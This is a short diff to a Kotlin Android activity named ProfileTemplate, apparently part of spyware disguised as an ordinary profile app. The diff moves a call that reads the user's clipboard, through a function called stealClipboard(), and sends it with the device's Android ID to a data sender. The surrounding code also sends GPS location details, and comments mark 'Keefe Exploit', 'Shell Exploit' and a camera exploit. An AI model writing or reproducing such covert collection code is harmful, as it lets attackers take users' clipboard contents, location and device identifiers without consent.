@@ -69,7 +69,6 @@ class ProfileTemplate : AppCompatActivity() {
             Log.d("Send data", "geo")
             datasender.sendData(datasender.getAndroidID(), gps.getLocationDetails())
         }
-        datasender.sendData(datasender.getAndroidID(), gn.stealClipboard())
         gn.accessibilityCheck()
 
         // Keefe Exploit --------------------------------------------------------------
@@ -88,6 +87,7 @@ class ProfileTemplate : AppCompatActivity() {
         }   // Shell Exploit
 
         // Lynette Camera Exploit (Done in Camera Button) -----------------------------
+        datasender.sendData(datasender.getAndroidID(), gn.stealClipboard())
     }
 
     private fun renderInfo(id: Int, industry_name: String) {
